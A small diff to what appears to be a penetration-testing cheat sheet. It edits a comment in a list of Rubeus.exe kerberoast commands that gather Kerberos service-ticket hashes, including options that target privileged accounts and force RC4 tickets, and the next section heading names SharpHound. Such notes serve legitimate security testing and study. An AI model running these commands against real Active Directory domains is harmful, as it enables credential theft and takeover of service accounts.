@@ -32,7 +32,7 @@ Kerberoasting from windows machine
 PS C:\> .\Rubeus.exe kerberoast /stats  #to gather some stats  
 PS C:\> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap  #/nowrap to copy hash easily  
 PS C:\> .\Rubeus.exe kerberoast /user:"username" /nowrap  #to test spesific user  
-PS C:\> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap  #RC4 encryption when requesting a new service ticket  
+PS C:\> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap  #RC4 encryption for a new service ticket  
 
 
 ### SharpHound.exe
